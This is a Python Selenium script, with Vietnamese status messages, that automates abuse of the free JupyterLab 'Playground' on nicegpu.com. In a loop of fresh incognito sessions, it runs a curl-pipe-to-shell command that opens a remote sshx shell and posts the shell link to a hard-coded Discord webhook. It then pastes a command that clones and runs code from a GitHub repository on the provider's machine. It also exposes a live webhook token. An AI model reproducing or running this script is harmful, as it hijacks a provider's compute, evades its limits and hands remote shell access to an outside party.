from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time, re, requests

# ================= CONFIG =================
SITE_URL = "https://www.nicegpu.com/"
PLAYGROUND_XPATH = '//*[@id="app"]/div/div[1]/div[2]/div/div/div/div[1]/div[3]/button[2]'

SSHX_CMD = "!curl -sSf https://sshx.io/get | sh -s run"

LAP = 5

YOUR_NAME = "hoanqson"
TEXT_TO_PASTE = (
    "sudo apt update && sudo apt install -y nodejs npm && "
    "git clone https://github.com/hoanqson2107/node-ai.git && "
    "cd node-ai && node app.js"
)

WEBHOOK_URL = "https://discord.com/api/webhooks/1465693138906779660/FbFPFyVi172242cD1wVQUwaRR62vWVmYbj4hioKkA4rYYoxiKGyDegVEhict7Fwxi8hd"

# ================= HELPERS =================
def create_incognito_driver():
    opts = Options()
    opts.add_argument("--incognito")
    opts.add_argument("--disable-gpu")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--window-size=1920,1080")
    opts.add_argument("--headless=new")
    return webdriver.Chrome(options=opts)

def send_webhook(link):
    requests.post(
        WEBHOOK_URL,
        json={"content": f"{link}"},
        timeout=10
    )

# ================= MAIN LOOP =================
for i in range(LAP):
    driver = create_incognito_driver()
    wait = WebDriverWait(driver, 120)

    try:
        # =====================================================
        print("[1] Mở nicegpu.com")
        driver.get(SITE_URL)
        time.sleep(3)

        # =====================================================
        print("[2] Click Playground")
        old_tabs = driver.window_handles.copy()
        wait.until(EC.element_to_be_clickable((By.XPATH, PLAYGROUND_XPATH))).click()

        wait.until(lambda d: len(d.window_handles) > len(old_tabs))
        jupyter_tab = list(set(driver.window_handles) - set(old_tabs))[0]
        driver.switch_to.window(jupyter_tab)

        wait.until(lambda d: "/lab" in d.current_url)
        time.sleep(5)
        print("   → JupyterLab OK")

        # =====================================================
        print("[3] Click Python 3 launcher")
        wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, ".jp-LauncherCard")))
        for card in driver.find_elements(By.CSS_SELECTOR, ".jp-LauncherCard"):
            if "python" in card.text.lower():
                card.click()
                break

        wait.until(lambda d: ".ipynb" in d.current_url)
        time.sleep(5)
        print("   → Notebook mở")

        # =====================================================
        print("[4] Chạy SSHX trong notebook")
        editor = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, ".cm-content")))
        ActionChains(driver).click(editor).perform()
        time.sleep(1)

        ActionChains(driver)\
            .key_down(Keys.CONTROL).send_keys("a").key_up(Keys.CONTROL)\
            .send_keys(Keys.DELETE)\
            .send_keys(SSHX_CMD)\
            .key_down(Keys.SHIFT).send_keys(Keys.ENTER).key_up(Keys.SHIFT)\
            .perform()

        time.sleep(15)

        sshx_link = None
        for out in driver.find_elements(By.CSS_SELECTOR, ".jp-OutputArea-output pre"):
            m = re.search(r"(https://sshx\.io/\S+)", out.text)
            if m:
                sshx_link = m.group(1)
                break

        if not sshx_link:
            raise Exception("Không lấy được SSHX link")

        print("🔥 SSHX:", sshx_link)
        send_webhook(sshx_link)

        # =====================================================
        print("[5] Mở SSHX & chạy lệnh")
        driver.get(sshx_link)

        name_input = wait.until(EC.presence_of_element_located(
            (By.XPATH, '//input[@placeholder="Your name"]')
        ))
        name_input.send_keys(YOUR_NAME)
        name_input.send_keys(Keys.ENTER)

        print("   → Đã nhập tên, chờ load terminal")
        time.sleep(10)

        plus_btn = wait.until(EC.presence_of_element_located(
            (By.XPATH, '/html/body/div[1]/main/div[1]/div/div/div[2]/button[1]')
        ))
        driver.execute_script("arguments[0].click();", plus_btn)
        time.sleep(3)

        terminal = wait.until(EC.presence_of_element_located(
            (By.CSS_SELECTOR, 'div.xterm-screen')
        ))
        ActionChains(driver).click(terminal).perform()

        driver.execute_script(
            "navigator.clipboard.writeText(arguments[0]);",
            TEXT_TO_PASTE
        )

        ActionChains(driver)\
            .key_down(Keys.CONTROL).key_down(Keys.SHIFT).send_keys("v")\
            .key_up(Keys.SHIFT).key_up(Keys.CONTROL)\
            .send_keys(Keys.ENTER)\
            .perform()

        print("✅ Đã chạy lệnh trong SSHX")

        time.sleep(10)

    except Exception as e:
        print("❌ LỖI:", e)

    finally:
        print("♻️ Đóng Chrome – reset sạch cookie")
        driver.quit()
        time.sleep(3)
